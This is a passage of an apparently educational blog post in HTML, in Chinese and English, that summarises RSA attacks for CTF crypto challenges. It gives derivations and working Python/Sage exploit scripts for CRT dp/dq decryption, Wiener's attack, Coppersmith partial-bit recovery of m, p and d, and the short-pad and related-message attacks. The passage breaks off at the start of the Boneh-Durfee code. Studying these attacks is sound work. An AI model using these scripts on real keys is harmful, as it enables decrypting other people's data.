class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">        d += modules</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    p = int(input(<span class="string">"p = "</span>))</span><br><span class="line">    q = int(input(<span class="string">"q = "</span>))</span><br><span class="line">    dp = int(input(<span class="string">"dp = "</span>))</span><br><span class="line">    dq = int(input(<span class="string">"dq = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = decrypt(p, q, dp, dq)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, p * q))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h4 id="sage">sage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = crt(dp, dq, p - <span class="number">1</span>, q - <span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="rsa---wieners-attack">RSA - Wiener's Attack</h3><h4 id="theorem-3">Theorem</h4><p><span class="math display">\[Let \ N=pq\ with\ q&lt;p&lt;2q. Let\ d&lt;\frac{1}{3}N^{\frac{1}{4}}.\\\\Known (N,e),we\ can\ use\ Wiener&#39;s\ attack.\\\\\]</span></p><hr><p><span class="math inline">\(Since\ ed\equiv 1(mod\ \varphi(N)),\exists k\in N,s.t.\ ed=k\varphi(N)+1\Rightarrow\left|\frac{e}{\varphi(N)}-\frac{k}{d}\right|=1.\)</span> From q&lt;p&lt;2q, it follows <span class="math inline">\(\sqrt{N}&lt;p&lt;\sqrt{2N}\)</span>, hence <span class="math inline">\(N-\varphi(N)=p+q-1=p+\frac{N}{p}-1&lt;\frac{3\sqrt{2}}{2}\sqrt{N}&lt;3\sqrt{N}\)</span> <span class="math inline">\(\therefore\left|\frac{e}{N}-\frac{k}{d}\right|=\left|\frac{ed-k\varphi(N)+k\varphi(N)-kN}{Nd}\right|=\left|\frac{1+k(\varphi(N)-N)}{Nd}\right|\leq\left|\frac{3k\sqrt{N}}{Nd}\right|=\left|\frac{3k}{\sqrt{N}d}\right|\)</span> <span class="math inline">\(\because k\varphi(N)=ed-1&lt;ed,\ e&lt;\varphi(N)\quad \therefore k\varphi(N)&lt;d\varphi(N)\rightarrow k&lt;d&lt;\frac{1}{3}N^{\frac{1}{4}}\)</span> <span class="math inline">\(\therefore\left|\frac{e}{N}-\frac{k}{d}\right|\leq\left|\frac{3k}{\sqrt{N}d}\right|&lt;\left|\frac{3k}{\sqrt{N}d}\right|&lt;\frac{1}{3d\cdot d}&lt;\frac{1}{2d^2}\)</span></p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200122234635721.png"></p><p>Therefore,we can get <span class="math inline">\(\frac{k}{d}\)</span> from the convergents of <span class="math inline">\(\frac{e}{N}\)</span>.</p><h4 id="exp-3">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_quotients</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    a = x // y</span><br><span class="line">    quotients = [a]</span><br><span class="line">    <span class="keyword">while</span> a * y != x:</span><br><span class="line">        x, y = y, x - a * y</span><br><span class="line">        a = x // y</span><br><span class="line">        quotients.append(a)</span><br><span class="line">    <span class="keyword">return</span> quotients</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_quotients</span><span class="params">(quotients)</span>:</span></span><br><span class="line">    convergents = [(quotients[<span class="number">0</span>], <span class="number">1</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, len(quotients) + <span class="number">1</span>):</span><br><span class="line">        quotients_partion = quotients[<span class="number">0</span>:i]</span><br><span class="line">        denom = quotients_partion[<span class="number">-1</span>]  <span class="comment"># 分母</span></span><br><span class="line">        num = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">-2</span>, -len(quotients_partion), <span class="number">-1</span>):</span><br><span class="line">            num, denom = denom, quotients_partion[_] * denom + num</span><br><span class="line">        num += denom * quotients_partion[<span class="number">0</span>]</span><br><span class="line">        convergents.append((num, denom))</span><br><span class="line">    <span class="keyword">return</span> convergents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WienerAttack</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    quotients = rational_to_quotients(e, n)</span><br><span class="line">    convergents = convergents_from_quotients(quotients)</span><br><span class="line">    <span class="keyword">for</span> (k, d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">and</span> <span class="keyword">not</span> (e * d - <span class="number">1</span>) % k:</span><br><span class="line">            phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">            <span class="comment"># check if (x^2 - coef * x + n = 0) has integer roots</span></span><br><span class="line">            coef = n - phi + <span class="number">1</span></span><br><span class="line">            delta = coef * coef - <span class="number">4</span> * n</span><br><span class="line">            <span class="keyword">if</span> delta &gt; <span class="number">0</span> <span class="keyword">and</span> gmpy2.iroot(delta, <span class="number">2</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">                print(<span class="string">'d = '</span> + str(d))</span><br><span class="line">                <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    e = int(input(<span class="string">"e = "</span>))</span><br><span class="line">    n = int(input(<span class="string">"n = "</span>))</span><br><span class="line">    c = int(input(<span class="string">"c = "</span>))</span><br><span class="line">    d = WienerAttack(e, n)</span><br><span class="line">    plaintext = long_to_bytes(pow(c, d, n))</span><br><span class="line">    print(plaintext)</span><br></pre></td></tr></table></figure><h3 id="rsa---partial_m">RSA - Partial_m</h3><h4 id="theorem-4">Theorem</h4><p>求解一元同余方程的问题可以这样来表达：给定一个未知分解的合数N，b是N的一个因子（注意b是合数），且对一个已知的<span class="math inline">\(\beta(0&lt;\beta&lt;1)\)</span>，满足<span class="math inline">\(b\geq N^{\beta}\)</span>。给定一个度数为<span class="math inline">\(\delta\)</span>，首1的单变量多项式<span class="math inline">\(f_{b}(x)\in Z[X]\)</span>，在<span class="math inline">\(\delta\)</span>和N的比特长度的多项式函数时间内找到所有<span class="math inline">\(b|f_{b}(x)\)</span>的满足<span class="math inline">\(|x_{0}|\leq X\)</span>的根<span class="math inline">\(x_{0}\in Z\)</span>，X是<span class="math inline">\(x_{0}\)</span>的上界。目标是通过尽可能宽松的界X获得更大的解出x的可能性。</p><p><strong>定理1</strong> (Coppersmith 96)：<span class="math inline">\(N,b,\beta,f,\delta\)</span>定义同上。此时我们可以在<span class="math inline">\(O(c\delta^{5}log^{9}N)\)</span>内得到满足条件：</p><p><span class="math inline">\(|x_{0}|\leq \frac{1}{2}N^{\frac{\beta^{2}}{\delta}-\epsilon}\)</span></p><p>的，一元同余方程f(x)=0 mod b的解 (<span class="math inline">\(\epsilon\)</span>多取<span class="math inline">\(\frac{\beta}{7}\)</span>, 证明略)</p><p><strong>定理2</strong> (CopperSmith 96[2])：定理1在N=b时的特殊情况，可以在(log N,<span class="math inline">\(\delta\)</span>)的多项式时间内求出所有满足：</p><p><span class="math inline">\(|x_{0}|\leq N^{\frac{1}{\delta}}\)</span></p><p>的模等式<span class="math inline">\(f_{N}(x)=0\ mod\ N\)</span>的解</p><p><span class="math inline">\(\therefore\)</span> e足够小，且部分明文泄露时，可以采用coppersmith单变量模等式的攻击，如下：</p><p><span class="math inline">\(c:=m^{e}\ mod\ n=(mbar+x_{0})^{e}\ mod\ n\)</span> , (mbar = (m &gt;&gt; kbits) &lt;&lt; kbits)</p><p>定理2知，<span class="math inline">\(|x_{0}|\leq N^{\frac{1}{e}}\)</span>时，可以在logN和e的多项式时间内求出x</p><h4 id="exp-4">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">mbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">print(<span class="string">"upper &#123;&#125; bits of &#123;&#125; bits is given"</span>.format(nbits - kbits, nbits))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line">print(<span class="string">"m:"</span>, mbar + x0)</span><br></pre></td></tr></table></figure><h4 id="note-1">Note</h4><p>m高位泄露是coppersmith的原版结论，实际上可以扩展到高位/低位/高低位泄露的一般情况</p><p><span class="math inline">\(m=M+x_{0}\cdot 2^{k}+M&#39;\)</span></p><p><span class="math inline">\(f_{n}(x):=(M+x_{0}\cdot 2^{k}+M&#39;)^{e}-c\)</span></p><p>化为首1即可sage求解（只要未知明文<span class="math inline">\(|x_{0}|\leq N^{\frac{1}{e}}\)</span>）</p><h3 id="rsa---partial_p">RSA - Partial_p</h3><h4 id="theorem-5">Theorem</h4><p><strong>定理3</strong> (Coppersmith: kp高位比特)：<span class="math inline">\(p&gt;q,k\in N^{*},q\nmid k\)</span>，如果对于kp的一个估计值<span class="math inline">\(\widetilde{p}\)</span>满足<span class="math inline">\(|kp-\widetilde{p}|\leq 2N^{\frac{1}{4}}\)</span></p><p>那么在多项式时间内可以得到N的分解</p><p>Proof：</p><p><span class="math inline">\(f_{p}(x):=x+\widetilde{p}\)</span>的一个解<span class="math inline">\(x_{0}=(kp-\widetilde{p})\ mod\ p\)</span> 满足<span class="math inline">\(x_{0}\leq 2N^{\frac{1}{4}}\)</span>。该多项式首1，且<span class="math inline">\(p\geq N^{\frac{1}{2}}\)</span>，由定理1知该方程有解</p><p>往一般形式上推广，发现p的低位比特泄露也能使用coppersmith攻击，化为首1即可，可类比partial_m的扩展形式</p><h4 id="exp-5">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">pbar = </span><br><span class="line">kbits = </span><br><span class="line"></span><br><span class="line">print(<span class="string">"upper %d bits (of %d bits) is given"</span> % (pbar.nbits()-kbits, pbar.nbits()))</span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line">print(<span class="string">"p:"</span>, p)</span><br><span class="line">q = n // int(p)</span><br><span class="line">d = inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">print(<span class="string">"m:"</span>, pow(c, d, n))</span><br></pre></td></tr></table></figure><h4 id="note-2">Note</h4><p>sage的small_root传参X不能过大，需自行判断阈值并调整（如果X过大，即使存在X内的解，也无法求出）</p><p>比如p的低位泄露时因为不确定缺失高位的具体比特数，所以要在<span class="math inline">\(2^{\frac{n.nbits()}{2}-kbits}\)</span>附近作X的阈值估计</p><p>无法确定拿到的p是否大于q，所以对<span class="math inline">\(\beta=0.5\)</span>进行调整至0.4</p><h3 id="rsa---partial_d">RSA - Partial_d</h3><h4 id="theorem-6">Theorem</h4><p>Given the <span class="math inline">\(\frac{n.nbits()}{4}\)</span> least significant bits of d，we can compute all of d in polynomial time in n and e.</p><p>Proof：</p><p><span class="math inline">\(s \leftarrow p+q\)</span>，<span class="math inline">\(ed=1+k\phi (n)=1+k(n-s+1)\)</span></p><p><span class="math inline">\(\therefore ed_{0}\equiv 1+k(n-s+1)\ mod\ 2^{\frac{n}{4}}\quad (1)\)</span></p><p><span class="math inline">\(\because p^{2}-sp+n\equiv 0\ mod\ 2^{\frac{n}{4}}\quad (2)\)</span></p><p><span class="math inline">\(\therefore p\cdot(1),k\cdot(2)\rightarrow ed_{0}p\equiv p+kpn-kp^{2}-kn+kp\ mod\ 2^{\frac{n}{4}}\quad (2)\)</span></p><p><span class="math inline">\(\therefore\)</span>解一元同余方程<span class="math inline">\(ed_{0}x-kx(n-x+1)+kn\equiv x\ (mod\ 2^{d_{0}.nbits()})\)</span>即可得到p的部分低位<span class="math inline">\(p_{0}\)</span></p><p>问题转化为partial_p</p><h4 id="exp-6">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.4</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line">    c = </span><br><span class="line">    d0 = </span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    </span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    print(<span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits))</span><br><span class="line"></span><br><span class="line">    p = int(find_p(d0, kbits, e, n))</span><br><span class="line">    print(<span class="string">"found p: %d"</span> % p)</span><br><span class="line">    q = n//int(p)</span><br><span class="line">    print(<span class="string">"d:"</span>, inverse_mod(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)))</span><br></pre></td></tr></table></figure><p>### RSA - Short Pad Attack &amp; Related Message Attack</p><h4 id="theorem-7">Theorem</h4><p>当padding长度<span class="math inline">\(m\in (0,\lfloor\frac{n.nbits()}{e^{2}}\rfloor]\)</span>时，<span class="math inline">\(g_{1}=x^{e}-c_{1},g_{2} = (x+y)^{e}-c_{2}\)</span>，可以先用结式求解上述二元高次方程组</p><p><strong>定理4</strong>：如果<span class="math inline">\((x_{0},y_{0})\)</span>是方程组<span class="math display">\[\left\{\begin{aligned}f(x,y)=0\\\\g(x,y)=0\end{aligned}\right.\]</span>的解，则<span class="math inline">\(y_{0}\)</span>是<span class="math inline">\(Res_{x}(f,g)\)</span>的一个根</p><p>sage里可以用resultant来实现结式计算，<span class="math inline">\(g_{1}.resultant(g_{2})\)</span>默认将结式以第二个变量来表示，也可以指定<span class="math inline">\(g_{1}.resultant(g_{2},y)\)</span>来将结式以x表示</p><p>求出y后，采用Related Message Attack，简要概括就是求解<span class="math inline">\(gcd(g_{1},g_{2})\)</span>，如果结果是线性的，则攻击成功(<span class="math inline">\(x=-gcd(g_{1}, g_{2})[0]\)</span>)</p><h4 id="exp-7">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span><span class="params">(c1, c2, e, n)</span>:</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line"></span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span><span class="params">(c1, c2, diff, e, n)</span>:</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(g1, g2)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    n = </span><br><span class="line">    e = </span><br><span class="line"></span><br><span class="line">    c1 =</span><br><span class="line">    c2 = </span><br><span class="line"></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    print(<span class="string">"difference of two messages is %d"</span> % diff)</span><br><span class="line"></span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    print(<span class="string">"m1:"</span>, m1)</span><br><span class="line">    print(<span class="string">"m2:"</span>, m1 + diff)</span><br></pre></td></tr></table></figure><h4 id="note-3">Note</h4><p>exp的change_ring缺失即报错，但同环下转换的具体原因，估计要翻sage手册orz</p><h3 id="rsa---boneh-durfee-attack">RSA - Boneh Durfee Attack</h3><h4 id="theorem-8">Theorem</h4><p>比维纳攻击强度更高的小私钥攻击</p><p>引用ctf-wiki上的简略推导过程：</p><p><img src= "/img/loading.gif" data-src="/2020/02/28/Summary-of-Crypto-in-CTF-RSA/image-20200218203256633.png"></p><p>后续应该用到了coppersmith对于多元模等式的攻击（坑有点儿深，具体证明略）</p><h4 id="exp-8">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span 